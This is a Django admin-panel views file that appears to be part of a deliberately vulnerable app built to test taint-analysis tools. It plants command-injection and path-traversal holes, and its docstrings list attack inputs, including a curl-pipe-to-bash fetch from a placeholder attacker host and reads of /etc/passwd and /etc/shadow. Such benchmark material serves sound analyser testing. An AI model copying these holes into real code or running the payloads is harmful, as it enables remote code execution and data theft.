"""
Admin Panel Views

Contains intentionally vulnerable endpoints for taint analysis demonstration.

Vulnerabilities:
- V05: Command Injection
- V06: Path Traversal
"""

import os
import subprocess

from django.shortcuts import render
from django.http import HttpResponse, JsonResponse, FileResponse
from django.contrib.admin.views.decorators import staff_member_required
from django.views.decorators.csrf import csrf_exempt
from django.conf import settings


# Base upload directory
UPLOAD_DIR = getattr(settings, 'UPLOAD_DIR', '/app/uploads/')


@staff_member_required
def dashboard(request):
    """Admin dashboard."""
    return render(request, 'admin_panel/dashboard.html')


@staff_member_required
def system_info(request):
    """
    Display system information.

    ==========================================================================
    VULNERABILITY V05: Command Injection
    ==========================================================================
    CWE-78: Improper Neutralization of Special Elements used in an OS Command

    Taint Flow:
        Source: request.GET['host']
        Propagation: f-string formatting
        Sink: subprocess.check_output() with shell=True

    Attack Vector:
        /admin-panel/system-info/?host=localhost;cat /etc/passwd
        /admin-panel/system-info/?host=localhost;whoami
        /admin-panel/system-info/?host=localhost;curl http://attacker.com/shell.sh|bash

    This is a critical vulnerability that allows Remote Code Execution (RCE).

    Expected Detection:
        - Pysa: UserControlled -> ShellExecution
        - CodeQL: py/command-injection
        - Semgrep: python.lang.security.audit.subprocess-shell-true

    ==========================================================================
    """
    host = request.GET.get('host', 'localhost')

    # =================================================================
    # VULNERABLE CODE - Command Injection (V05)
    # =================================================================
    # SINK: User input directly in shell command

    command = f"ping -c 3 {host}"

    try:
        # VULNERABLE: shell=True allows command chaining with ; | && ||
        result = subprocess.check_output(
            command,
            shell=True,  # SINK - Command Injection
            stderr=subprocess.STDOUT,
            timeout=10
        )
        output = result.decode('utf-8')
    except subprocess.CalledProcessError as e:
        output = e.output.decode('utf-8') if e.output else str(e)
    except subprocess.TimeoutExpired:
        output = "Command timed out"
    except Exception as e:
        output = str(e)

    return render(request, 'admin_panel/system_info.html', {
        'host': host,
        'output': output,
    })


@staff_member_required
@csrf_exempt
def run_diagnostic(request):
    """
    Run system diagnostic tools.

    VULNERABILITY V05 (variant): Command Injection via os.system()
    """
    if request.method != 'POST':
        return render(request, 'admin_panel/diagnostics.html')

    tool = request.POST.get('tool', 'uptime')

    # =================================================================
    # VULNERABLE CODE - Command Injection (V05)
    # =================================================================
    # SINK: Direct execution of user input

    # Using os.system - vulnerable to command injection
    exit_code = os.system(tool)  # SINK

    return JsonResponse({
        'tool': tool,
        'exit_code': exit_code,
        'message': 'Diagnostic complete' if exit_code == 0 else 'Diagnostic failed'
    })


@staff_member_required
@csrf_exempt
def execute_command(request):
    """
    Execute arbitrary commands (intentionally dangerous).

    VULNERABILITY V05 (variant): Direct command execution
    """
    if request.method != 'POST':
        return render(request, 'admin_panel/execute.html')

    command = request.POST.get('command', '')

    if not command:
        return JsonResponse({'error': 'No command provided'}, status=400)

    try:
        # VULNERABLE: Executing arbitrary command
        result = subprocess.check_output(
            command,
            shell=True,  # SINK
            stderr=subprocess.STDOUT,
            timeout=30
        )
        output = result.decode('utf-8')
        success = True
    except subprocess.CalledProcessError as e:
        output = e.output.decode('utf-8') if e.output else str(e)
        success = False
    except Exception as e:
        output = str(e)
        success = False

    return JsonResponse({
        'command': command,
        'output': output,
        'success': success
    })


@staff_member_required
def file_manager(request):
    """File manager interface."""
    return render(request, 'admin_panel/file_manager.html')


@staff_member_required
def download_file(request):
    """
    Download a file from the server.

    ==========================================================================
    VULNERABILITY V06: Path Traversal
    ==========================================================================
    CWE-22: Improper Limitation of a Pathname to a Restricted Directory

    Taint Flow:
        Source: request.GET['filename']
        Propagation: os.path.join() (does not prevent traversal)
        Sink: open()

    Attack Vector:
        /admin-panel/download/?filename=../../../etc/passwd
        /admin-panel/download/?filename=../vulnshop/settings.py
        /admin-panel/download/?filename=....//....//....//etc/shadow

    This vulnerability allows reading arbitrary files on the server,
    potentially exposing sensitive configuration, credentials, and data.

    Expected Detection:
        - Pysa: UserControlled -> FileSystemAccess
        - CodeQL: py/path-injection
        - Semgrep: python.lang.security.audit.path-traversal

    ==========================================================================
    """
    filename = request.GET.get('filename', '')

    if not filename:
        return HttpResponse('No filename provided', status=400)

    # =================================================================
    # VULNERABLE CODE - Path Traversal (V06)
    # =================================================================
    # SINK: os.path.join does NOT prevent path traversal
    # If filename is "../../../etc/passwd", it will still work

    filepath = os.path.join(UPLOAD_DIR, filename)

    # No validation of the resulting path!
    try:
        with open(filepath, 'rb') as f:  # SINK - Path Traversal
            content = f.read()

        response = HttpResponse(content, content_type='application/octet-stream')
        response['Content-Disposition'] = f'attachment; filename="{os.path.basename(filename)}"'
        return response

    except FileNotFoundError:
        return HttpResponse('File not found', status=404)
    except PermissionError:
        return HttpResponse('Permission denied', status=403)
    except Exception as e:
        return HttpResponse(f'Error: {e}', status=500)


@staff_member_required
def view_file(request):
    """
    View file contents.

    VULNERABILITY V06 (variant): Path Traversal for viewing files
    """
    filename = request.GET.get('filename', '')

    if not filename:
        return JsonResponse({'error': 'No filename provided'}, status=400)

    # VULNERABLE: Path traversal
    filepath = os.path.join(UPLOAD_DIR, filename)

    try:
        with open(filepath, 'r') as f:  # SINK
            content = f.read()

        return JsonResponse({
            'filename': filename,
            'content': content,
            'size': len(content)
        })

    except FileNotFoundError:
        return JsonResponse({'error': 'File not found'}, status=404)
    except UnicodeDecodeError:
        return JsonResponse({'error': 'Binary file cannot be displayed'}, status=400)
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=500)


@staff_member_required
def list_files(request):
    """
    List files in a directory.

    VULNERABILITY V06 (variant): Path Traversal for directory listing
    """
    directory = request.GET.get('dir', '')

    # VULNERABLE: Path traversal
    dirpath = os.path.join(UPLOAD_DIR, directory)

    try:
        files = []
        for entry in os.scandir(dirpath):  # SINK
            files.append({
                'name': entry.name,
                'is_dir': entry.is_dir(),
                'size': entry.stat().st_size if entry.is_file() else None,
            })

        return JsonResponse({
            'directory': directory,
            'files': files
        })

    except FileNotFoundError:
        return JsonResponse({'error': 'Directory not found'}, status=404)
    except NotADirectoryError:
        return JsonResponse({'error': 'Not a directory'}, status=400)
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=500)


@staff_member_required
@csrf_exempt
def delete_file(request):
    """
    Delete a file.

    VULNERABILITY V06 (variant): Path Traversal for file deletion
    """
    if request.method != 'POST':
        return JsonResponse({'error': 'POST required'}, status=405)

    filename = request.POST.get('filename', '')

    if not filename:
        return JsonResponse({'error': 'No filename provided'}, status=400)

    # VULNERABLE: Path traversal
    filepath = os.path.join(UPLOAD_DIR, filename)

    try:
        os.remove(filepath)  # SINK - Could delete any file
        return JsonResponse({
            'success': True,
            'message': f'Deleted {filename}'
        })

    except FileNotFoundError:
        return JsonResponse({'error': 'File not found'}, status=404)
    except PermissionError:
        return JsonResponse({'error': 'Permission denied'}, status=403)
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=500)


@staff_member_required
def server_logs(request):
    """
    View server logs.

    Uses command injection vulnerable approach.
    """
    log_file = request.GET.get('log', 'access.log')
    lines = request.GET.get('lines', '100')

    # VULNERABLE: Command injection via log file name
    command = f"tail -n {lines} /var/log/{log_file}"

    try:
        result = subprocess.check_output(
            command,
            shell=True,  # SINK
            stderr=subprocess.STDOUT
        )
        output = result.decode('utf-8')
    except Exception as e:
        output = str(e)

    return render(request, 'admin_panel/logs.html', {
        'log_file': log_file,
        'output': output,
    })
